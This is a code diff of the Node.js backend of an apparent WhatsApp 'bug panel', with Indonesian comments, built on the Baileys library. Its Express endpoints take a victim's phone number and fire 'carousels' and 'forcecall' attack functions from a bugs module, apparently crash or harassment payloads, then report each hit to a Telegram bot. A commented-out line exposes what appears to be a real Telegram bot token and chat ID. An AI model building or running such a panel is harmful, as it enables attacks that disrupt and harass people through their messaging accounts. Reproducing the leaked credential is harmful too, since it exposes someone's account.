@@ -1,7 +1,8 @@
 // index.js (Ini adalah file backend Node.js Anda)
 
 console.clear();  
-require('./config'); // Pastikan path ini benar jika config ada di public/settings
+// --- PERBAIKAN: Path require() untuk config.js (sekarang di root) ---
+require('./config'); 
 
 console.log('Starting KepfoЯannaS Backend...');  
 process.on("uncaughtException", console.error);  
@@ -13,8 +14,9 @@ const {
     fetchLatestBaileysVersion,   
     jidDecode,   
     getContentType,   
-    MessageRetryMap, // Perlu diimpor jika digunakan
-    relayWAMessage // Perlu diimpor jika digunakan
+    Browsers,   
+    // MessageRetryMap, // Komentar: Hapus jika tidak digunakan
+    // relayWAMessage // Komentar: Hapus jika tidak digunakan
 } = require("@whiskeysockets/baileys");  
   
 const pino = require('pino');  
@@ -26,36 +28,36 @@ const cors = require("cors");
 const path = require("path");    
 const { Boom } = require('@hapi/boom');
 
-// --- Konfigurasi Global (Tambahan) ---
-// Ganti dengan username Telegram bot Anda dan chat ID Anda
-global.telegram_api_token = 'YOUR_TELEGRAM_BOT_API_TOKEN'; // Dapatkan dari @BotFather di Telegram
-global.telegram_chat_id = 'YOUR_TELEGRAM_CHAT_ID'; // Chat ID pribadi/grup Anda
-global.creator = 'KepfoЯannaS'; // Creator name for API responses
+// --- HAPUS: Redundansi Konfigurasi Global (sekarang hanya dari config.js) ---
+// global.telegram_api_token = '7771429262:AAHwRR2VVM0Wlh1LWsmk9V3ZRifx8RZUU9Y'; 
+// global.telegram_chat_id = '6878949999'; 
+// global.creator = 'KepfoЯannaS'; 
 
-// Import service modules (as per your structure)
-// Pastikan path ini benar
-const { carousels2, forceCall } = require('./bugs'); // Asumsi ada di public/service/bugs.js
-const { getRequest, sendTele } = require('./telegram'); // Asumsi ada di public/engine/telegram.js
-const { konek } = require('./connect'); // Asumsi ada di connect.js
+// Import service modules (sekarang diasumsikan di root directory backend)
+// --- PERBAIKAN: Path require() untuk modul service (sekarang di root) ---
+const { carousels2, forceCall } = require('./bugs'); // Asumsi di root
+const { getRequest, sendTele } = require('./telegram'); // Asumsi di root
+const { konek } = require('./connect'); // Asumsi di root
 
 const app = express();  
-const PORT = process.env.PORT || 5036; // Default port 5036, bisa diubah via env
+const PORT = process.env.PORT || 5036; 
 
 app.enable("trust proxy");  
 app.set("json spaces", 2);  
-app.use(cors()); // MENGIZINKAN SEMUA CORS - PENTING UNTUK FRONTEND!
+app.use(cors()); 
 app.use(express.urlencoded({   
   extended: true   
 }));  
 app.use(express.json());  
-// Melayani file statis dari folder public (termasuk index.html, app.js, styles.css)
+// Melayani file statis dari folder public (frontend: index.html, app.js, styles.css)
+// Ini tetap sama, karena frontend masih di public/
 app.use(express.static(path.join(__dirname, "public")));  
 app.use(bodyParser.raw({   
   limit: '50mb',   
   type: '*/*'   
 }));  
 
-const usePairingCode = true; // Sesuai dengan konfigurasi Baileys Anda
+const usePairingCode = true; 
 
 const question = (text) => {
     const rl = readline.createInterface({
@@ -68,61 +70,56 @@ const question = (text) => {
 }
 
 async function clientstart() {
-    console.log(`Baileys version: ${version}, isLatest: ${isLatest}`);
-	const { state, saveCreds } = await useMultiFileAuthState(`./session`);
-    const { version, isLatest } = await fetchLatestBaileysVersion();
+    const { state, saveCreds } = await useMultiFileAuthState(`./session`);
+    const { version, isLatest } = await fetchLatestBaileysVersion(); 
+    
+    console.log(`Baileys version: ${version}, isLatest: ${isLatest}`); 
     
     const client = makeWASocket({
         logger: pino({ level: "silent" }),
-        printQRInTerminal: !usePairingCode, // Print QR only if not using pairing code
+        printQRInTerminal: !usePairingCode, 
         auth: state,
-        browser: Browsers.macOS('Desktop'), // Menggunakan Browsers dari Baileys
-        // Ini adalah MessageRetryMap yang Anda impor di awal
-        // messageRetryMap: MessageRetryMap 
+        browser: Browsers.macOS('Desktop'), 
     });
       
     if (usePairingCode && !client.authState.creds.registered) {
         const phoneNumber = await question('Please enter your WhatsApp number (e.g., 62812xxxxxx):\n> ');  
-        const code = await client.requestPairingCode(phoneNumber.trim()); // Trim whitespace
+        const code = await client.requestPairingCode(phoneNumber.trim()); 
         console.log(`Your pairing code: ${code}`);  
     }
 
     // --- API Endpoints for Frontend (Bug Panel) ---
     app.get('/api/bug/carousels', async (req, res) => {
-        const { target, fjids } = req.query; // fjids bisa jadi 'ios' atau 'android'
+        const { target, fjids } = req.query; 
         
         if (!target) return res.status(400).json({
             status: false, 
             message: "Parameter 'target' diperlukan"
         });
-        // Jika fjids digunakan sebagai penanda OS
         if (!fjids) return res.status(400).json({
             status: false,  
             message: "Parameter 'fjids' (OS) diperlukan"
         });  
 
-        let formattedTarget = target.replace(/[^0-9]/g, ""); // Hapus non-digit
+        let formattedTarget = target.replace(/[^0-9]/g, ""); 
         if (formattedTarget.startsWith("0")) return res.status(400).json({
             status: false,
             message: "Gunakan awalan kode negara (misal: 62)!"
         });
         
         let jid = formattedTarget + '@s.whatsapp.net';
-        const info = await getRequest(req); // Mengambil info request untuk logging/telegram
+        const info = await getRequest(req); 
 
         try {
-            // Panggil fungsi carousels2 dari service/bugs
-            // Asumsi carousels2 menerima client dan JID target
-            await carousels2(client, jid, fjids); // Melewatkan fjids ke service jika diperlukan
+            await carousels2(client, jid, fjids); 
             
             res.json({
                 status: true,
-                creator: global.creator,
+                creator: global.creator, // Mengambil dari global.creator di config.js
                 result: `Successfully sent carousels (pairing code sim.) to ${target} for OS ${fjids}.`
             });
             console.log(`[API] Successfully sent carousels (pairing code sim.) to ${jid}`);
 
-            // Kirim notifikasi ke Telegram (jika global.telegram_api_token & chat_id diset)
             const logMessage = `\n[API HIT]
 Endpoint: Carousels (Pairing Code)
 Target: ${target}
@@ -132,7 +129,8 @@ Method: ${info.method}
 Timestamp: ${info.timestamp}
 
 This is a part of API monitoring system.`;
-            if (global.telegram_api_token && global.telegram_chat_id) {
+            // Menggunakan global.telegram_api_token dan global.telegram_chat_id dari config.js
+            if (global.telegram_api_token && global.telegram_chat_id) { 
                 sendTele(logMessage);
             }
 
@@ -162,7 +160,6 @@ This is a part of API monitoring system.`;
         const info = await getRequest(req);
 
         try {
-            // Panggil fungsi forceCall dari service/bugs
             await forceCall(client, jid);
             
             res.json({
@@ -172,7 +169,6 @@ This is a part of API monitoring system.`;
             });
             console.log(`[API] Successfully sent forcecall to ${jid}`);
 
-            // Kirim notifikasi ke Telegram
             const logMessage = `\n[API HIT]
 Endpoint: Forcecall
 Target: ${target}
@@ -194,13 +190,9 @@ This is a part of API monitoring system.`;
         }
     });  
 
-    // API Endpoint for "Send No Target" (simulasi)
     app.get('/api/bug/no_target', async (req, res) => {
         const info = await getRequest(req);
         try {
-            // Logika simulasi atau pemanggilan fungsi backend yang tidak butuh target
-            // Contoh: await someInternalFunction(client);
-            
             res.json({
                 status: true,
                 creator: global.creator,
@@ -228,14 +220,9 @@ This is a part of API monitoring system.`;
         }
     });
 
-    // API Endpoint for "Toggle Delay" (simulasi)
     app.get('/api/bug/toggle_delay', async (req, res) => {
         const info = await getRequest(req);
         try {
-            // Logika simulasi atau pemanggilan fungsi backend untuk toggle delay
-            // Global state atau database untuk delay bot akan diubah di sini
-            // Contoh: global.botDelayActive = !global.botDelayActive;
-
             res.json({
                 status: true,
                 creator: global.creator,
@@ -263,32 +250,25 @@ This is a part of API monitoring system.`;
         }
     });
 
-    // API Endpoint untuk mendapatkan status bot (simulasi, untuk frontend)
     app.get('/api/bot_status', async (req, res) => {
-        // Dalam real-world, ini akan mengambil status koneksi Baileys
-        // Contoh: const status = client.ws.readyState === WebSocket.OPEN ? 'Online' : 'Offline';
-        // Atau status bot dari sistem koneksi Anda
-        const realBotStatus = client.user ? 'Online' : 'Offline'; // Lebih realistis
+        const botOnlineStatus = client.user ? true : false; 
         res.json({
             status: true,
-            botOnline: client.user ? true : false,
-            message: `Bot is currently ${realBotStatus}.`
+            botOnline: botOnlineStatus,
+            message: `Bot is currently ${botOnlineStatus ? 'Online' : 'Offline'}.`
         });
     });
    
-    // Event listener koneksi Baileys
     client.ev.on('connection.update', (update) => {
-        // Gunakan fungsi konek dari connect
         konek({ 
             client, 
             update, 
-            clientstart, // Untuk auto-restart/reconnect
+            clientstart, 
             DisconnectReason,
             Boom
         });  
     });  
     
-    // Simpan kredensial saat ada update
     client.ev.on('creds.update', saveCreds);  
     
     return client;
@@ -297,9 +277,9 @@ This is a part of API monitoring system.`;
 clientstart();
 
 // --- Express Server Startup ---
-// Menangani request untuk index.html (frontend)
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html')); // Asumsi index.html ada di public folder
+  // --- PERBAIKAN: Path index.html di public folder ---
+  res.sendFile(path.join(__dirname, 'public', 'index.html')); 
 });
 
 app.listen(PORT, () => {
@@ -307,10 +287,10 @@ app.listen(PORT, () => {
 }).on('error', (err) => {
   if (err.code === 'EADDRINUSE') {
     console.error(`Port ${PORT} is in use. Trying another port...`);
-    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); // Random high port
+    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); 
     app.listen(newPort, () => {
       console.log(`Server is running on http://localhost:${newPort}`);
-      PORT = newPort; // Update PORT variable if successful
+      // Perhatikan: PORT di sini adalah local scope, tidak akan mengubah variabel di luar
     });
   } else {
     console.error('An error occurred:', err.message);
